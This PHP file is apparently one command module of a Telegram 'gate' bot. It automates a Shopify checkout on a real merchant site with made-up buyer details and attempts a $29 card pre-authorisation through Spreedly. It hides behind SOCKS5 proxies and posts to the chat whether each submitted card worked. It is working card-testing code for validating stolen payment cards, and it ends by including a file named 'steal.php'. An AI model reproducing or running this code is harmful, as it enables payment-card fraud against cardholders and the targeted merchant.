<?php
$start_time = microtime(true);

if ($message == '.sfa' or $message == '/sfa' or $message == '!sfa' or $message == ',sfa' or $message == '?sfa') {sendMessage($chatId, "<b>✅𝙶𝚊𝚝𝚎 𝙸𝚗𝚏𝚘: %0A• SHOPIFY%2BAUTHORIZE 29$ PREAUTH %0A• 𝙾𝚝𝚑𝚎𝚛 𝙶𝚊𝚝𝚎𝚜: /cmds </b>", $message_id);exit();}


include 'Tools/regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{sendMessage($chatId, "<b>⚠ [ALERT] PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN</b>", $message_id);exit();}

$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];

//if (number_format($mon) < 10){$mon = "0"."$mon";};

if(strlen($year) == 2){
($year = "20"."$year");
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

$max_retries = 5;
$retry_count = 0;

//include 'Tools/proxy.php';
////////////////////////////////////////////////////////////////////////////////////////////////

sleep (3);

#01. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://dailyhighclub.com/cart/add.js');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'items%5B0%5D%5Bid%5D=32435612745808&items%5B0%5D%5Bproperties%5D%5Bshipping_interval_unit_type%5D=Months&items%5B0%5D%5Bproperties%5D%5Bshipping_interval_frequency%5D=1&items%5B0%5D%5Bquantity%5D=1');
$headerss = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $header) use (&$headerss) {
    $len = strlen($header);
    $header = trim($header);
    if (strpos($header, 'x-shopify-generated-cart-token:') === 0) {
        $headerss['X-Shopify-Generated-Cart-Token'] = trim(substr($header, strlen('x-shopify-generated-cart-token:')));
    }
    return $len;
});
$curl1 = curl_exec($ch);
echo $headerss['X-Shopify-Generated-Cart-Token'];

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.dailyhighclub.com/r/checkout?myshopify_domain=dollaroll.myshopify.com&cart_token='.$headerss['X-Shopify-Generated-Cart-Token'].'&_ga=2.145083184.522616598.1678478552-1781106348.1678478552');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl2 = curl_exec($ch);
$auth = trim(strip_tags(getStr($curl2,'name="authenticity_token" value="','"')));
$paytk = trim(strip_tags(getStr($curl2,', \"token\": \"','\"')));

sleep (3);

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.dailyhighclub.com/r/pay/'.$paytk.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout%5Bclient_details%5D%5Bbrowser_width%5D=1241&checkout%5Bclient_details%5D%5Bbrowser_height%5D=604&cart_token='.$headerss['X-Shopify-Generated-Cart-Token'].'&myshopify_domain=dollaroll.myshopify.com&authenticity_token='.$auth.'&little_data_info=633049123.1678481144&previous_step=contact_information&checkout%5Bemail%5D=abhays32109%40gmail.com&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Jack&checkout%5Bshipping_address%5D%5Blast_name%5D=Coddrey&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=111+Lake+Hollingsworth+Dr%2C+%23+15972&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Lakeland&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=Florida&checkout%5Bshipping_address%5D%5Bzip%5D=33801&checkout%5Bshipping_address%5D%5Bphone%5D=4257823782&commit=Continue&checkout%5Bclient_details%5D%5Bbrowser_width%5D=414&checkout%5Bclient_details%5D%5Bbrowser_height%5D=715');
$curl3 = curl_exec($ch);

sleep (4);

#04. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://core.spreedly.com/v1/payment_methods.js?environment_key=9Q9x4ixSJVE9Yg5tnVZXB64vQnE&kind=credit_card&full_name=Jack+Coddrey&number='.$c1.'+'.$c2.'+'.$c3.'+'.$c4.'&verification_value='.$cvv.'&month='.$mon.'&year='.$year.'&email=abhays32109%40gmail.com&shipping_address1=111+Lake+Hollingsworth+Dr%2C+%23+15972&shipping_address2=None&shipping_city=Lakeland&shipping_state=Florida&shipping_zip=33801&shipping_country=United+States&shipping_phone_number=4257823782&address1=111+Lake+Hollingsworth+Dr%2C+%23+15972&address2=None&city=Lakeland&state=Florida&zip=33801&country=United+States&phone_number=4257823782&callback=jQuery111209992419002699278_1678481351456&_=1678481351457');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl4 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl4,'payment_method":{"token":"','"')));

sleep (3);

$unix_time = time();
# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.dailyhighclub.com/r/purchase/'.$paytk.'?request_id='.$unix_time.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_nonce=&recharge_payment_method_nonce=&spreedly_temp_payment_method_token='.$pid.'&cart_token='.$headerss['X-Shopify-Generated-Cart-Token'].'&checkout%5Bpayment_gateway_type%5D=authorize&checkout%5Bshipping_rate_id%5D=Guaranteed+Shipping+%2B+Handling&checkout%5Bpayment_gateway%5D=credit_card&checkout%5Bcredit_card%5D%5Bname%5D=Jack+Coddrey&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=414&checkout%5Bclient_details%5D%5Bbrowser_height%5D=715');
$curl5 = curl_exec($ch);
$rsppppp = trim(strip_tags(getStr($curl5,'<span style="font-size:15px;color:red" class="error-message">','</span>')));

sleep (1);

# 06 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.dailyhighclub.com/r/purchase/thanks/'.$paytk.'/?shop_url=dollaroll.myshopify.com#no-back');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl6 = curl_exec($ch);
$Messagesuccess = trim(strip_tags(getStr($curl6,'<h3 class="thank-you__title">','</h3>')));

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl6, 'Thank you for your purchase')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: SHOPIFY%2BAUTHORIZE 29$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Pre Authorized For 29$%0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $Messagesuccess%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢  $bank1 - $brand - $type</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢  $name2 - $emoji - $currency</b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl5, '<span style="font-size:15px;color:red" class="error-message">')) || (strpos($curl5, '<span style="font-size:15px;color:red" class="error-message">')) || (strpos($curl5, 'Card Decline Error')) || (strpos($curl5, 'Card Decline Error')) || (strpos($curl5, 'declined')) || (strpos($curl5, 'declined'))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: SHOPIFY%2BAUTHORIZE 29$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Charge%0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $rsppppp %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢  $bank1 - $brand - $type</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢  $name2 - $emoji - $currency</b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
else {
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: SHOPIFY%2BAUTHORIZE 29$%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Charge%0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $rsppppp%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢  $bank1 - $brand - $type</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢  $name2 - $emoji - $currency</b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 :<b><a href='tg://user?id=$userId'>$userId</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
include 'steal.php';
curl_close($ch);
?>